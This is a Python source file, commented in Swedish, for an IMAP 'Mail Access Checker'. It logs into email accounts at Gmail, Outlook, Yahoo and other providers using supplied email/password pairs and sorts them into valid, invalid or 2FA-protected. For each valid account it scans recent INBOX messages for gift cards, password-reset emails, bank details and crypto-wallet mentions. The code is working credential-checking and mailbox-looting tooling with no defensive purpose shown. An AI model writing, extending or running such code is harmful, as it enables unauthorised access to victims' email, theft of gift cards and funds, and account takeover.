"""
IMAP Client för Mail Access Checker
Hanterar anslutning, autentisering och email crawling
"""

import imaplib
import ssl
import socket
import email
import re
from typing import Dict, List, Optional, Tuple, Any
from email.header import decode_header
from datetime import datetime

from core.config import Config
from core.logger import MailAccessLogger
from core.exceptions import (
    ConnectionError, AuthenticationError, ProtocolError, 
    TimeoutError, InvalidCredentialsError, TwoFactorAuthRequired
)

class IMAPClient:
    """IMAP klient för e-postaccess och crawling"""
    
    def __init__(self, config: Config, logger: MailAccessLogger):
        self.config = config
        self.logger = logger
        self.connection = None
        self.is_connected = False
        self.current_mailbox = None
        
    def test_account(self, email: str, password: str) -> Dict[str, Any]:
        """
        Testar ett e-postkonto och returnerar detaljerad information
        
        Returns:
            Dict med status, meddelanden, statistik etc.
        """
        result = {
            'email': email,
            'status': 'unknown',
            'accessible': False,
            'error': None,
            'mailboxes': [],
            'message_count': 0,
            'recent_messages': [],
            'crawl_results': {}
        }
        
        try:
            # Anslut och autentisera
            if self.connect_and_authenticate(email, password):
                result['status'] = 'valid'
                result['accessible'] = True
                
                # Samla grundläggande information
                result['mailboxes'] = self.get_mailboxes()
                
                # Crawla huvudmappen (INBOX)
                crawl_data = self.crawl_inbox()
                result.update(crawl_data)
                
                self.logger.success(f"Framgångsrikt access till {email}")
                
            else:
                result['status'] = 'invalid'
                
        except AuthenticationError as e:
            result['status'] = 'invalid'
            result['error'] = str(e)
            self.logger.error(f"Autentiseringsfel för {email}: {e}")
            
        except TwoFactorAuthRequired as e:
            result['status'] = 'requires_2fa'
            result['error'] = str(e)
            self.logger.warning(f"2FA krävs för {email}")
            
        except ConnectionError as e:
            result['status'] = 'connection_error'
            result['error'] = str(e)
            self.logger.error(f"Anslutningsfel för {email}: {e}")
            
        except Exception as e:
            result['status'] = 'error'
            result['error'] = str(e)
            self.logger.error(f"Oväntat fel för {email}: {e}")
            
        finally:
            self.disconnect()
            
        return result
    
    def connect_and_authenticate(self, email: str, password: str) -> bool:
        """Ansluter till IMAP-server och autentiserar"""
        try:
            # Hämta serverinställningar för leverantören
            provider_config = self._get_provider_config(email)
            
            host = provider_config['host']
            port = provider_config['port']
            use_ssl = provider_config.get('ssl', True)
            
            self.logger.debug(f"Ansluter till {host}:{port} (SSL: {use_ssl})")
            
            # Skapa anslutning
            if use_ssl:
                # Skapa SSL-kontext
                context = ssl.create_default_context()
                self.connection = imaplib.IMAP4_SSL(host, port, ssl_context=context)
            else:
                self.connection = imaplib.IMAP4(host, port)
                
            # Sätt timeout
            self.connection.sock.settimeout(self.config.timeout)
            
            # Autentisera
            self.logger.debug(f"Autentiserar {email}")
            status, data = self.connection.login(email, password)
            
            if status != 'OK':
                raise AuthenticationError(f"Autentisering misslyckades: {data}", email)
                
            self.is_connected = True
            self.logger.debug(f"Framgångsrik autentisering för {email}")
            return True
            
        except imaplib.IMAP4.error as e:
            error_msg = str(e).lower()
            
            if 'authentication failed' in error_msg or 'login failed' in error_msg:
                raise InvalidCredentialsError(f"Ogiltiga inloggningsuppgifter: {e}", email)
            elif 'two-factor' in error_msg or '2fa' in error_msg:
                raise TwoFactorAuthRequired(f"Tvåfaktor-autentisering krävs: {e}", email)
            else:
                raise AuthenticationError(f"IMAP-fel: {e}", email)
                
        except (socket.error, socket.timeout) as e:
            raise ConnectionError(f"Nätverksfel: {e}", provider_config['host'], provider_config['port'])
            
        except Exception as e:
            raise ProtocolError(f"IMAP-protokollfel: {e}", 'imap')
    
    def _get_provider_config(self, email: str) -> Dict[str, Any]:
        """Hämtar serverinställningar för e-postleverantör"""
        domain = email.split('@')[-1].lower()
        
        # Försök hämta från config först
        provider_config = self.config.get_provider_config(email, 'imap')
        
        if provider_config:
            return provider_config
            
        # Fallback för vanliga leverantörer
        fallback_configs = {
            'hotmail.com': {'host': 'outlook.office365.com', 'port': 993, 'ssl': True},
            'outlook.com': {'host': 'outlook.office365.com', 'port': 993, 'ssl': True},
            'live.com': {'host': 'outlook.office365.com', 'port': 993, 'ssl': True},
            'gmail.com': {'host': 'imap.gmail.com', 'port': 993, 'ssl': True},
            'yahoo.com': {'host': 'imap.mail.yahoo.com', 'port': 993, 'ssl': True},
            'engineer.com': {'host': 'imap.mail.com', 'port': 993, 'ssl': True},
            'mail.com': {'host': 'imap.mail.com', 'port': 993, 'ssl': True}
        }
        
        if domain in fallback_configs:
            return fallback_configs[domain]
            
        # Standard IMAP-inställningar som fallback
        return {'host': f'imap.{domain}', 'port': 993, 'ssl': True}
    
    def get_mailboxes(self) -> List[str]:
        """Hämtar lista över tillgängliga mappar"""
        if not self.is_connected:
            return []
            
        try:
            status, mailboxes = self.connection.list()
            if status != 'OK':
                return []
                
            folder_list = []
            for mailbox in mailboxes:
                # Parsea mappnamn från IMAP-respons
                if isinstance(mailbox, bytes):
                    mailbox = mailbox.decode('utf-8')
                    
                # Extrahera mappnamn (sista delen efter sista citattecken)
                parts = mailbox.split('"')
                if len(parts) >= 3:
                    folder_name = parts[-2]
                    folder_list.append(folder_name)
                    
            return folder_list
            
        except Exception as e:
            self.logger.debug(f"Fel vid hämtning av mappar: {e}")
            return []
    
    def crawl_inbox(self, limit: int = 50) -> Dict[str, Any]:
        """
        Crawlar INBOX och söker efter intressant innehåll
        
        Args:
            limit: Max antal meddelanden att kontrollera
            
        Returns:
            Dict med crawl-resultat
        """
        crawl_results = {
            'message_count': 0,
            'crawled_count': 0,
            'gift_cards': [],
            'passwords': [],
            'bank_info': [],
            'crypto_info': [],
            'interesting_emails': []
        }
        
        if not self.is_connected:
            return crawl_results
            
        try:
            # Välj INBOX
            status, data = self.connection.select('INBOX')
            if status != 'OK':
                self.logger.warning("Kunde inte välja INBOX")
                return crawl_results
                
            # Hämta totalt antal meddelanden
            crawl_results['message_count'] = int(data[0])
            
            if crawl_results['message_count'] == 0:
                self.logger.info("INBOX är tom")
                return crawl_results
            
            # Sök efter senaste meddelanden
            status, message_ids = self.connection.search(None, 'ALL')
            if status != 'OK':
                return crawl_results
                
            ids = message_ids[0].split()
            
            # Begränsa antal meddelanden att crawla
            ids_to_crawl = ids[-limit:] if len(ids) > limit else ids
            crawl_results['crawled_count'] = len(ids_to_crawl)
            
            self.logger.info(f"Crawlar {len(ids_to_crawl)} meddelanden...")
            
            # Crawla varje meddelande
            for i, msg_id in enumerate(ids_to_crawl):
                try:
                    message_data = self._crawl_message(msg_id)
                    if message_data:
                        self._categorize_content(message_data, crawl_results)
                        
                    # Progress update
                    if i % 10 == 0:
                        self.logger.debug(f"Crawlat {i+1}/{len(ids_to_crawl)} meddelanden")
                        
                except Exception as e:
                    self.logger.debug(f"Fel vid crawling av meddelande {msg_id}: {e}")
                    continue
                    
            return crawl_results
            
        except Exception as e:
            self.logger.error(f"Fel vid crawling av INBOX: {e}")
            return crawl_results
    
    def _crawl_message(self, msg_id: bytes) -> Optional[Dict[str, Any]]:
        """Crawlar ett enskilt meddelande"""
        try:
            # Hämta meddelande
            status, msg_data = self.connection.fetch(msg_id, '(RFC822)')
            if status != 'OK':
                return None
                
            # Parsea e-postmeddelande
            raw_email = msg_data[0][1]
            email_message = email.message_from_bytes(raw_email)
            
            # Extrahera grundläggande information
            subject = self._decode_header(email_message.get('Subject', ''))
            sender = self._decode_header(email_message.get('From', ''))
            date = email_message.get('Date', '')
            
            # Extrahera meddelandetext
            body = self._extract_body(email_message)
            
            return {
                'id': msg_id.decode(),
                'subject': subject,
                'sender': sender,
                'date': date,
                'body': body
            }
            
        except Exception as e:
            self.logger.debug(f"Fel vid parsning av meddelande: {e}")
            return None
    
    def _decode_header(self, header: str) -> str:
        """Avkodar e-posthuvud"""
        if not header:
            return ''
            
        try:
            decoded_parts = decode_header(header)
            decoded_header = ''
            
            for part, encoding in decoded_parts:
                if isinstance(part, bytes):
                    decoded_header += part.decode(encoding or 'utf-8', errors='ignore')
                else:
                    decoded_header += part
                    
            return decoded_header.strip()
            
        except Exception:
            return header
    
    def _extract_body(self, email_message) -> str:
        """Extraherar meddelandetext från e-post"""
        body = ""
        
        try:
            if email_message.is_multipart():
                for part in email_message.walk():
                    content_type = part.get_content_type()
                    if content_type == "text/plain":
                        payload = part.get_payload(decode=True)
                        if payload:
                            body += payload.decode('utf-8', errors='ignore')
                    elif content_type == "text/html" and not body:
                        # Använd HTML som fallback om ingen plain text finns
                        payload = part.get_payload(decode=True)
                        if payload:
                            body += payload.decode('utf-8', errors='ignore')
            else:
                payload = email_message.get_payload(decode=True)
                if payload:
                    body = payload.decode('utf-8', errors='ignore')
                    
        except Exception as e:
            self.logger.debug(f"Fel vid extrahering av meddelandetext: {e}")
            
        return body
    
    def _categorize_content(self, message_data: Dict[str, Any], crawl_results: Dict[str, Any]):
        """Kategoriserar meddelandeinnehåll baserat på nyckelord"""
        subject = message_data.get('subject', '').lower()
        body = message_data.get('body', '').lower()
        full_text = f"{subject} {body}"
        
        # Presentkorts-detektion
        gift_card_keywords = [
            'presentkort', 'gift card', 'voucher', 'rabattkod', 'discount code',
            'steam', 'amazon', 'google play', 'apple', 'itunes', 'spotify',
            'netflix', 'xbox', 'playstation', 'visa gift'
        ]
        
        for keyword in gift_card_keywords:
            if keyword in full_text:
                crawl_results['gift_cards'].append({
                    'message': message_data,
                    'keyword': keyword,
                    'relevance': 'high' if keyword in subject else 'medium'
                })
                break
        
        # Lösenords-detektion
        password_keywords = [
            'password', 'lösenord', 'reset', 'återställ', 'new password',
            'temporary password', 'account access', 'login details'
        ]
        
        for keyword in password_keywords:
            if keyword in full_text:
                crawl_results['passwords'].append({
                    'message': message_data,
                    'keyword': keyword
                })
                break
        
        # Bank/finansiell information
        bank_keywords = [
            'bank', 'kredit', 'debit', 'kontoutdrag', 'statement',
            'swish', 'paypal', 'överföring', 'transfer', 'saldo'
        ]
        
        for keyword in bank_keywords:
            if keyword in full_text:
                crawl_results['bank_info'].append({
                    'message': message_data,
                    'keyword': keyword
                })
                break
        
        # Kryptovaluta-information
        crypto_keywords = [
            'bitcoin', 'btc', 'ethereum', 'eth', 'crypto', 'coinbase',
            'binance', 'kraken', 'wallet', 'blockchain'
        ]
        
        for keyword in crypto_keywords:
            if keyword in full_text:
                crawl_results['crypto_info'].append({
                    'message': message_data,
                    'keyword': keyword
                })
                break
    
    def disconnect(self):
        """Stänger IMAP-anslutning"""
        if self.connection and self.is_connected:
            try:
                self.connection.close()
                self.connection.logout()
            except:
                pass
            finally:
                self.connection = None
                self.is_connected = False